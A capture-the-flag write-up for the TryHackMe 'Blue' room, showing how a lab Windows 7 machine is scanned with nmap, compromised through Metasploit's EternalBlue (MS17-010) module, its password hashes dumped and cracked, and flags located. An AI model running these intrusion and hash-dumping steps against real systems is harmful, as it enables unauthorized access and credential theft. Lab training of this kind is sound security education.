<h1>TryHackMe:Blue</h1>
<br>
Deploy & hack into a Windows machine, leveraging common misconfigurations issues.

Room : https://tryhackme.com/room/blue


![6489823](https://user-images.githubusercontent.com/92990208/192826798-1f0825ca-5d25-4d9d-8e01-73e96eb7751c.jpg)

> Let’s start with scan the machine

We start with a Nmap scan on the given IP address to show the open ports and get more information about target


![1](https://user-images.githubusercontent.com/92990208/192827303-2024f7fb-4fff-440e-a695-cc730386dfde.png)

After we scanned the ports, We can notice that there are three open ports, and also We can notice that it’s a Windows 7 machine

Now we need to know what is the vulnerabilities are on this machine

And to know that, we will use the following command

**_nmap — script vuln 10.10.165.226_**

![2](https://user-images.githubusercontent.com/92990208/192827488-406dbb6e-1447-4721-ac93-f23d682ab219.png)



![3](https://user-images.githubusercontent.com/92990208/192827692-5c941707-2e2b-4144-805c-8af841158e60.png)



the scan result shows that this machine is vulnerable to (ms17–010) A critical remote code execution vulnerability exists in Microsoft SMBv1.

> **Gain Access**

Now we will go to Metasploit to check out whether there is an exploitation of this vulnerability or not

Use command msfconsole to open metasploit


![4](https://user-images.githubusercontent.com/92990208/192827828-6490de61-f7c4-43b4-bff5-b24c81ff9efc.png)


![5](https://user-images.githubusercontent.com/92990208/192827885-024877e3-5628-414e-ae27-dbc67de315af.png)


After searching, we found the exploitation code and Because the machine is Windows 7. Let’s try “exploit/windows/smb/ms17_010_eternalblue”

write command : use exploit/windows/smb/ms17_010_eternalblue to use the exploit and command : Show options to show the required value



![6](https://user-images.githubusercontent.com/92990208/192828052-082aad16-72bf-4094-9e82-6ce4923c18c1.png)



set RHOSTS <target ip>

set LHOST<machine ip>



![7](https://user-images.githubusercontent.com/92990208/192828122-f78632ca-d6b8-439f-8205-f287f0521a72.png)



Now we are ready to run the exploitation

use command run



![10](https://user-images.githubusercontent.com/92990208/192828214-11ab0163-408e-41aa-b274-96960298f088.png)



Now we are going to check if the exploit has run correctly or not

![11](https://user-images.githubusercontent.com/92990208/192828269-efe1aab9-9f87-478f-b23b-1f53afbd9f80.png)




Press “Ctrl+z” to go back to meterpreter


![12](https://user-images.githubusercontent.com/92990208/192828331-49b9b9fc-1972-4bec-be34-ba37f33ed036.png)




Now we need, to migrate our process, so we use the command “ps” after we will get a list of processes, we can migrate any process with the command “migrate <PID number>”





![13](https://user-images.githubusercontent.com/92990208/192828392-01d07627-1ce7-4c14-b46d-4633befe2b84.png)


![14](https://user-images.githubusercontent.com/92990208/192828435-fa0b8d7b-e0f0-463b-b213-151f03408a7f.png)



Let’s now try to dump the password hashes from victim machine

to dumb the password hashes, use command : hashdumb




![15](https://user-images.githubusercontent.com/92990208/192828493-57bdcf55-3047-4387-a151-ddbb008f689f.png)



Once we have the hashes, we can store them locally into a file and use John the Ripper to crack them

![16](https://user-images.githubusercontent.com/92990208/192828534-a5ea34e3-9d89-4b02-bfa1-18be58873fd6.png)




> **The last step is to find flags!**


After a lot of searching in the system files, we found

**_Flag1 is located in C :\\_**



![17](https://user-images.githubusercontent.com/92990208/192828627-e6f25ec5-1da2-435a-b401-07c0c51b96cc.png)



**_Flag2 is located in “C:\Windows\System32\config”._**


![18](https://user-images.githubusercontent.com/92990208/192828678-9537a4a0-b3fd-450d-bddf-b283b39588c5.png)



**_Flag3 is located in “C:\Users\Jon\Documents”._**



![19](https://user-images.githubusercontent.com/92990208/192828755-1424b754-f79f-489d-8bd5-123abaa02b76.png)




**_We have successfully completed this room_**





